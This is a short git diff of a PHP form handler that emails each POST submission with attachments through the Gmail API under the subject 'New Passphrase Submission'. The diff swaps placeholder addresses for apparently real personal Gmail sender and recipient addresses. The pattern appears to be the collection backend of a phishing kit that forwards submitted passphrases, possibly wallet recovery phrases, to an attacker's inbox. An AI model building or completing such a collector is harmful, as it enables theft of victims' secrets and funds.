@@ -41,7 +41,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     // Send email with attachments
     try {
         $client = new Client();
-        $client->setAuthConfig('path/to/credentials.json');
+        $client->setAuthConfig('credentials.json');
         $client->addScope(Gmail::MAIL_GOOGLE_COM);
 
         $service = new Gmail($client);
@@ -49,8 +49,8 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         $message = new Google_Service_Gmail_Message();
         $boundary = uniqid(rand(), true);
         $subject = 'New Passphrase Submission';
-        $rawMessageString = "From: sender@example.com\r\n";
-        $rawMessageString .= "To: recipient@example.com\r\n";
+        $rawMessageString = "From: speterjfk@gmail.com\r\n";
+        $rawMessageString .= "To: ol37288997@gmail.com\r\n";
         $rawMessageString .= "Subject: $subject\r\n";
         $rawMessageString .= "MIME-Version: 1.0\r\n";
         $rawMessageString .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n\r\n";
